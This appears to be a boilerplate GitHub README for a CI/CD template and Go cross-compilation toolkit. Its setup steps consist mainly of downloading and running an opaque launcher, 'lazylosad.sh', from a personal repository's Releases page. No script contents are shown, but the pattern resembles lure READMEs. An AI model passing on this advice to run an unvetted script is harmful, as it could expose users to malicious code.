Overview
Scripts for Integration is a practical collection of reusable automation assets. It includes templates for continuous integration and delivery, build and test scripts, release automation, and tooling to keep your codebase healthy. A Go-oriented layer helps you cross-compile for multiple platforms, making it easier to ship binaries for different targets. The launcher lazylosad.sh lets you pull down the exact templates you need directly from your IDE.

This project is designed for teams of any size. It emphasizes reliability, clarity, and small surface area. The templates are modular, easy to adapt, and tested against a range of project types. The Go layer adds a structured path to cross-compiling Go programs without adding clutter to your main workflow.

Whatâ€™s Inside
- Core Bash scripts: Lightweight utilities for setup, validation, and bootstrap of projects.
- CI/CD templates: Ready-made pipelines for common scenarios, including build, test, lint, security checks, and releases.
- Git hooks: Pre-commit, pre-push, and other hooks to enforce standards before code lands.
- Go-oriented layer: Cross-compilation support and Go-specific templates to simplify multi-arch builds.
- Launcher integration: lazylosad.sh, a launcher that fetches and installs the right templates from the Releases page.
- Extensible structure: A clean folder layout that makes it easy to add new templates without breaking existing workflows.
- Documentation and examples: Clear examples, usage notes, and practical explanations to help you get productive quickly.

How It Works
- You run lazylosad.sh from within your IDE. The launcher fetches the latest templates from the Releases page and places them in your project.
- Templates are organized by purpose and language. This keeps your project clean while offering a consistent experience across languages.
- The Go layer lets you cross-compile for multiple targets with minimal configuration. It integrates with the CI/CD templates to streamline multi-arch releases.
- Git hooks help enforce code quality and consistency at commit and push time.

Quick Start
- Prerequisites: A Unix-like environment (Linux/macOS), Bash, curl, and Git. For Go builds, a Go toolchain may be used depending on your needs.
- Step 1: Open your project in your IDE. Ensure you have network access to fetch templates.
- Step 2: Download lazylosad.sh from the Releases page and run it to install templates into your project.
- Step 3: Follow the prompts to select templates for your project type. The launcher will place the right files in your repository.
- Step 4: Review the generated templates and adjust as needed. Start with a simple pipeline to validate the setup.
- Step 5: Save changes and commit. Use the included Git hooks to enforce policy on commits and pushes.

Installation and Setup
- Locate the Releases page: https://github.com/chulxx/scripts-for-integration/releases
- From the Releases page, download lazylosad.sh. This launcher is designed to fetch and install the templates into your project.

Templates and How to Use Them
- CI/CD templates: Prebuilt workflows for various platforms. Each template includes:
  - Build steps
  - Test steps
  - Lint and static analysis
  - Security checks (e.g., dependency checks)
  - Deploy or release steps
  - Caching strategies to speed up runs
- Git hooks: Hooks to prevent common pitfalls. Examples include:
  - Pre-commit hooks for code formatting, linting, and unit tests
  - Pre-push hooks to ensure tests pass before pushing
  - Commit-msg hooks to enforce conventional commits
- Bash scripts: Everyday automation tasks such as:
  - Environment setup
  - Dependency installation
  - Code quality checks
  - Release automation helpers
- Go layer: A dedicated layer for Go projects with cross-compilation support. It includes:
  - Go module templates
  - Cross-compilation configurations
  - Lightweight Go-specific helper scripts
  - Examples for multi-arch builds

Getting Started with Templates
- After running lazylosad.sh, look for a templates directory in your project root. Each template has:
  - A README-like description
  - A minimal example to adapt
  - Environment variable placeholders
- Start with a simple pipeline. For example, a basic build and test template for a typical Go project:
  - Setup: Install dependencies
  - Build: go build ./...
  - Test: go test ./...
  - Lint: golangci-lint run
  - Cache: Go module cache
- Adapt the template to your CI platform. The repository includes variants for:
  - GitHub Actions
  - GitLab CI
  - CircleCI
  - Jenkins pipelines
- Use the templates as a baseline. You can replace steps with your own commands and add extra steps for security checks, code coverage, and performance tests.

Go Layer and Cross-Compilation
- The Go layer targets cross-compilation. It helps you generate binaries for multiple operating systems and architectures.
- Typical commands:
  - export GOOS=linux GOARCH=amd64
  - go build ./...
  - export GOOS=windows GOARCH=amd64
  - go build ./...
- The templates include pre-defined cross-compile configurations and sample release artifacts for major targets.
- When you publish releases, you can attach prebuilt binaries for each target. The CI templates can automate this packaging step.

Git Hooks and Release Automation
- Pre-commit hooks ensure code quality before you commit:
  - Run unit tests
  - Run linters
  - Check formatting
- Pre-push hooks validate the pipeline is green before pushing to the central repo
- Hook customization: You can adjust the scripts to fit your codebase and existing tooling.
- Release automation: Templates include steps to automate semantic versioning, changelog generation, and draft releases.

CI/CD Templates for Popular Platforms

- Best practices:
  - Keep templates small and composable
  - Use environment variables to avoid hard-coding values
  - Document each template with a short usage note
  - Use consistent naming across templates for easy discovery
- Versioning: Templates are versioned in releases. The lazylosad.sh launcher helps you stay aligned with the right set of templates for each project version.

Security and Best Practices
- Security checks are included in the templates. They help catch:
  - Known vulnerable dependencies
  - License issues
  - Unsafe shell fragments
- Use the Go layer for controlled cross-compilation. Keep binaries from your CI environment to reduce risk.
- Review access to secrets. Use secret management features of your chosen CI/CD platform, not hard-coded values in templates.
- Keep the launcher and templates up to date by regularly checking the Releases page.

Testing and Quality Assurance
- Each template includes a subset of tests appropriate for its domain.
- Run unit tests and integration tests where applicable.
- Use linting and code quality checks to keep the codebase clean.
